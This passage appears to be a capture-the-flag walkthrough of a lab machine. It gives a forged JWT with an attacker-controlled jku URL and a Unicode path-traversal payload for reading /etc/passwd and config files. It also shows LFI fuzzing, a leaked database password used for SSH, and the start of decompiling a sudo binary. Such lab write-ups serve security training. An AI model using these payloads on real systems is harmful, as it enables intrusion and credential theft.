+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g</span><br></pre></td></tr></table></figure>
+
+<p>Copy the encoded JWT and add it as cookie value.</p>
+<p>I am using Firefox add-on called ‘cookie editor’ to replace cookies easily. Save it and refresh the page.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2114.jpg"></li>
+</ul>
+<p>We got the admin dashboard access. If you click on any of the saved reports, it will display you below message.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2115.jpg"></li>
+</ul>
+<p>As you can see from address bar, it is fetching that pdf file from different location. There’s a possibility of path traversal attack. Let’s try to read any local file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>It is filtering our inputs, we need to bypass it. To bypass that we have to use ‘unicode’ characters. Below blog explains how to use it and it’s impact.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9sYXphcnYuY29tL3Bvc3RzL3VuaWNvZGUtbm9ybWFsaXphdGlvbi12dWxuZXJhYmlsaXRpZXMv">Unicode normalization vulnerabilities<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>For this machine, we will use below payload.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">sshd:x:112:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">code:x:1000:1000:,,,:/home/code:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2116.jpg"></li>
+</ul>
+<p>As you can see, we can read local files now via this technique. Now we need to fuzz to find the files which we can read.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/ffuf]</span><br><span class="line">└─<span class="comment"># ./ffuf -u &#x27;http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/FUZZ&#x27; -b &#x27;auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g&#x27; -mc 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fw 1299</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.1.0-git</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</span></span><br><span class="line"><span class="string"> :: Header           : Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE0LjMwL2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Om_Ox6WkDDtAnFWnyBHdXkkPXZFpe-h1yof4IEKWi5zGk3i_iBWVnOlp8HTNAXA9NI8R5J3T7qbczaTLZYer-pvd2W7j19dxbWw3Lz-raQcXhpMJRILVOsuNkEQgus5-HSC5oF3fEXQfQLnYvXb8RsUhlaHUAzWOpBAqunrQXvKG_13RiBa1XifDIXZnirNSs3i2gdf4l2lo9yB5t3R2Rb8WFqPQx8xgZpXfGFyoJ1QgGsz_0el_lKq_EXvzpt4VcLx9xOMGoB1a_bGYsAncxBQl3fWuNNDkUgFG0sYA9VSfU2ws85ctVu8i32OiREbadYuZ6kvZD_rgWdyRSbME4g</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 1299</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/passwd             [Status: 200, Size: 1876, Words: 17, Lines: 36]</span></span><br><span class="line"><span class="string">/etc/group              [Status: 200, Size: 778, Words: 1, Lines: 60]</span></span><br><span class="line"><span class="string">/proc/self/environ      [Status: 200, Size: 208, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="string">/proc/self/cmdline      [Status: 200, Size: 87, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="string">/proc/self/stat         [Status: 200, Size: 313, Words: 52, Lines: 2]</span></span><br><span class="line"><span class="string">/proc/self/status       [Status: 200, Size: 1367, Words: 93, Lines: 56]</span></span><br><span class="line"><span class="string">/proc/self/fd/0         [Status: 200, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="string">/etc/mysql/my.cnf       [Status: 200, Size: 682, Words: 89, Lines: 22]</span></span><br></pre></td></tr></table></figure>
+
+<p>None of these files are useful for our cause. They don’t have any information which can help us to gain shell access. However, we know that NginX is running on the machine, we can guess the path of configuration file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default</span><br><span class="line"></span><br><span class="line">server&#123;</span><br><span class="line"><span class="comment">#Change the Webroot from /home/code/coder/ to /var/www/html/</span></span><br><span class="line"><span class="comment">#change the user password from db.yaml</span></span><br><span class="line">	listen 80;</span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://localhost:8000;</span><br><span class="line">		include /etc/nginx/proxy_params;</span><br><span class="line">		proxy_redirect off;</span><br><span class="line">	&#125;</span><br><span class="line">	location /static/&#123;</span><br><span class="line">		<span class="built_in">alias</span> /home/code/coder/static/styles/;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>One of the file gives us this above information about password change for the user and it has already given the path of the file too. Let’s read it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml</span><br><span class="line"></span><br><span class="line">mysql_host: <span class="string">&quot;localhost&quot;</span></span><br><span class="line">mysql_user: <span class="string">&quot;code&quot;</span></span><br><span class="line">mysql_password: <span class="string">&quot;B3stC0d3r2021@@!&quot;</span></span><br><span class="line">mysql_db: <span class="string">&quot;user&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>We have the database password. Let’s login via SSH using these creds.and we got user flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># ssh code@10.10.11.126</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.126 (10.10.11.126)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:SnMpKuOJvoXQsmvAqpabXWgEhnhEAkNeEnQ/zKJnmJs.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.126<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">code@10.10.11.126&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed 01 Dec 2021 03:00:28 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.17              Processes:             316</span><br><span class="line">  Usage of /:   82.5% of 3.87GB   Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  Memory usage: 82%               IPv4 address <span class="keyword">for</span> eth0: 10.10.11.126</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"> * Super-optimized <span class="keyword">for</span> small spaces - <span class="built_in">read</span> how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">8 updates can be applied immediately.</span><br><span class="line">8 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Mon Nov 29 14:14:14 2021 from 10.10.14.23</span><br><span class="line">code@code:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(code) gid=1000(code) <span class="built_in">groups</span>=1000(code)</span><br><span class="line">code@code:~$ <span class="built_in">whoami</span></span><br><span class="line">code</span><br><span class="line">code@code:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">c44ed9130688a2816ef0bbcd5d561f19</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2117.jpg"></li>
+</ul>
+<h1 id="privesclation"><a href="#privesclation" class="headerlink" title="privesclation"></a>privesclation</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code@code:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> code on code:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User code may run the following commands on code:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/treport</span><br></pre></td></tr></table></figure>
+
+<p>We have permission to run the binary file with root’s privileges. Let’s look into it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code@code:~$ sudo /usr/bin/treport</span><br><span class="line">1.Create Threat Report.</span><br><span class="line">2.Read Threat Report.</span><br><span class="line">3.Download A Threat Report.</span><br><span class="line">4.Quit.</span><br><span class="line">Enter your choice:1</span><br><span class="line">Enter the filename:<span class="built_in">test</span></span><br><span class="line">Enter the report:<span class="built_in">test</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;treport.py&quot;</span>, line 74, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;treport.py&quot;</span>, line 13, <span class="keyword">in</span> create</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: <span class="string">&#x27;/root/reports/test&#x27;</span></span><br><span class="line">[5308] Failed to execute script <span class="string">&#x27;treport&#x27;</span> due to unhandled exception!</span><br></pre></td></tr></table></figure>
+
+<p>Upon executing this binary, it gives us four options to choose. If we choose option one, then ultimately it gives us this above error. Looks like it is a binary file compiled with python.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3I=">pyinstxtractor<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Using above code we can extract python script from a binary.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># scp code@10.10.11.126:/usr/bin/treport .</span></span><br><span class="line">code@10.10.11.126<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">treport                                                                          100% 6690KB  80.7KB/s   01:22    </span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span></span><br><span class="line"><span class="string">└─# python pyinstxtractor.py treport </span></span><br><span class="line"><span class="string">[+] Processing treport</span></span><br><span class="line"><span class="string">[+] Pyinstaller version: 2.1+</span></span><br><span class="line"><span class="string">[+] Python version: 38</span></span><br><span class="line"><span class="string">[+] Length of package: 6798297 bytes</span></span><br><span class="line"><span class="string">[+] Found 46 files in CArchive</span></span><br><span class="line"><span class="string">[+] Beginning extraction...please standby</span></span><br><span class="line"><span class="string">[+] Possible entry point: pyiboot01_bootstrap.pyc</span></span><br><span class="line"><span class="string">[+] Possible entry point: pyi_rth_pkgutil.pyc</span></span><br><span class="line"><span class="string">[+] Possible entry point: pyi_rth_multiprocessing.pyc</span></span><br><span class="line"><span class="string">[+] Possible entry point: pyi_rth_inspect.pyc</span></span><br><span class="line"><span class="string">[+] Possible entry point: treport.pyc</span></span><br><span class="line"><span class="string">[!] Warning: This script is running in a different Python version than the one used to build the executable.</span></span><br><span class="line"><span class="string">[!] Please run this script in Python38 to prevent extraction errors during unmarshalling</span></span><br><span class="line"><span class="string">[!] Skipping pyz extraction</span></span><br><span class="line"><span class="string">[+] Successfully extracted pyinstaller archive: treport</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can now use a python decompiler on the pyc files within the extracted directory</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span></span><br><span class="line"><span class="string">└─# ls</span></span><br><span class="line"><span class="string">jwks.json  pyinstxtractor.py  treport  treport_extracted</span></span><br></pre></td></tr></table></figure>
+
+<p>It extracted the python files and saved it in a directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># ls treport_extracted/                                                                                          </span></span><br><span class="line">base_library.zip  libffi.so.7          libssl.so.1.1            pyimod02_archive.pyc         pyi_rth_pkgutil.pyc</span><br><span class="line">libbz2.so.1.0     liblzma.so.5         libtinfo.so.6            pyimod03_importers.pyc       PYZ-00.pyz</span><br><span class="line">libcrypto.so.1.1  libmpdec.so.2        libz.so.1                pyimod04_ctypes.pyc          PYZ-00.pyz_extracted</span><br><span class="line">lib-dynload       libpython3.8.so.1.0  pyiboot01_bootstrap.pyc  pyi_rth_inspect.pyc          struct.pyc</span><br><span class="line">libexpat.so.1     libreadline.so.8     pyimod01_os_path.pyc     pyi_rth_multiprocessing.pyc  treport.pyc</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unicode]</span><br><span class="line">└─<span class="comment"># file treport_extracted/treport.pyc </span></span><br><span class="line">treport_extracted/treport.pyc: python 2.7 byte-compiled</span><br></pre></td></tr></table></figure>
+
+<p>It has a lot of file, we have byte-compiled file. We can’t just read like normal files. We need to disassemble and decompile to read the contents.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pyYXgvcHljZGM=">pycdc<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>We will use this above project to do that. We could have used ‘uncompyle6’ but it only supports python version up to 3.8. This byte-compiled file is created with python version 3.9. Clone the project and we need to compile it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/pycdc]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">ASTNode.cpp   bytecode_ops.inl     data.cpp     pyc_code.cpp  pyc_module.cpp   pyc_sequence.cpp    scripts</span><br><span class="line">ASTNode.h     bytes                data.h       pyc_code.h    pyc_module.h     pyc_sequence.h      tests</span><br><span class="line">ASTree.cpp    CMakeCache.txt       FastStack.h  pycdas        pyc_numeric.cpp  pyc_string.cpp</span><br><span class="line">ASTree.h      CMakeFiles           libpycxx.a   pycdas.cpp    pyc_numeric.h    pyc_string.h</span><br><span class="line">bytecode.cpp  cmake_install.cmake  LICENSE      pycdc         pyc_object.cpp   PythonBytecode.txt</span><br><span class="line">bytecode.h    CMakeLists.txt       Makefile     pycdc.cpp     pyc_object.h     README.markdown</span><br><span class="line">┌──(root💀kali)-[~/pycdc]</span><br><span class="line">└─<span class="comment"># cmake CMakeLists.txt</span></span><br><span class="line">-- The C compiler identification is GNU 11.2.0</span><br><span class="line">-- The CXX compiler identification is GNU 11.2.0</span><br><span class="line">-- Detecting C compiler ABI info</span><br><span class="line">-- Detecting C compiler ABI info - <span class="keyword">done</span></span><br><span class="line">-- Check <span class="keyword">for</span> working C compiler: /usr/bin/cc - skipped</span><br><span class="line">-- Detecting C compile features</span><br><span class="line">-- Detecting C compile features - <span class="keyword">done</span></span><br><span class="line">-- Detecting CXX compiler ABI info</span><br><span class="line">-- Detecting CXX compiler ABI info - <span class="keyword">done</span></span><br><span class="line">-- Check <span class="keyword">for</span> working CXX compiler: /usr/bin/c++ - skipped</span><br><span class="line">-- Detecting CXX compile features</span><br><span class="line">-- Detecting CXX compile features - <span class="keyword">done</span></span><br><span class="line">-- Found PythonInterp: /usr/bin/python (found 